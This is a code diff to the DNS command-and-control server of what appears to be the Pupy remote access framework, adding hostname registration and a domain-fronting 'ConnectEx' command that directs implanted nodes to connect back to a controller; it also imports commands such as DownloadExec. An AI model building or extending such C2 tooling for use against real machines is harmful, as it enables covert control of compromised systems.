@@ -1,10 +1,14 @@
 # -*- coding: utf-8 -*-
 import logging
 from PupyCredentials import Credentials
-from network.lib.picocmd.server import DnsCommandServerHandler, DnsCommandServer
+from network.lib.picocmd.server import (
+    DnsCommandServerHandler, DnsCommandServer, SessionDependedCommand
+)
 from network.lib.picocmd.picocmd import (
-    OnlineStatusRequest, CheckConnect, Connect, Disconnect,
-    Reexec, Sleep, Exit, SetProxy, DownloadExec, PasteLink
+    OnlineStatusRequest, CheckConnect, Connect, ConnectEx,
+    RegisterHostnameId, Disconnect,
+    Reexec, Sleep, Exit, SetProxy, DownloadExec, PasteLink,
+    UnregisteredTargetId
 )
 
 from pupylib.PupyConfig import PupyConfig
@@ -162,16 +166,48 @@ class PupyDnsCommandServerHandler(DnsCommandServerHandler):
         return self.add_command(
             CheckConnect(host, first, last), session=node, default=default)
 
-    def connect(self, hosts, port, transport, node=None, default=False):
-        commands = [
-            Connect(host, port, transport) for host in hosts
-        ]
+    def connect(self, address, port, transport, hostname, node=None, default=False):
+        def connect_ex(session):
+            if not session.system_info_version >= 1:
+                return
 
-        applied = 0
-        for command in commands:
-            applied = self.add_command(command, session=node, default=default)
+            commands = []
+            conn_address = None
+            host_target_id = None
 
-        return applied
+            try:
+                conn_address = netaddr.IPAddress(address)
+
+                if hostname is not None and hostname != address:
+                    raise NotImplementedError(
+                        'Fronting with IP address as main target are not supported'
+                    )
+
+            except netaddr.core.AddrFormatError:
+                try:
+                    target_id = session.registered_hosts.get_target_id(address)
+                except UnregisteredTargetId:
+                    target_id = session.registered_hosts.register(address)
+                    commands.append(RegisterHostnameId(target_id, address))
+
+                if hostname is not None and hostname != address:
+                    try:
+                        host_target_id = session.registered_hosts.get_target_id(hostname)
+                    except UnregisteredTargetId:
+                        host_target_id = session.registered_hosts.register(hostname)
+                        commands.append(RegisterHostnameId(host_target_id, hostname))
+
+                conn_address = target_id
+
+            commands.append(ConnectEx(conn_address, port, transport, host_target_id))
+            return commands
+
+        command = SessionDependedCommand(
+            Connect(address, port, transport),
+            connect_ex
+        )
+
+        return self.add_command(command, session=node, default=default)
 
     def disconnect(self, node=None, default=False):
         return self.add_command(Disconnect(), session=node, default=default)
@@ -368,7 +404,7 @@ class PupyDnsCnc(object):
     def nodes(self, node):
         return self.dns_handler.find_nodes(node)
 
-    def connect(self, host=None, port=None, transport=None, node=None, default=False):
+    def connect(self, host, port, transport, hostname=None, node=None, default=False):
         if port:
             port = int(port)
 
@@ -425,7 +461,7 @@ class PupyDnsCnc(object):
                     transport, host, port))
 
         return self.dns_handler.connect(
-            [host], port, transport,
+            host, port, transport, hostname,
             node=node,
             default=default
         )
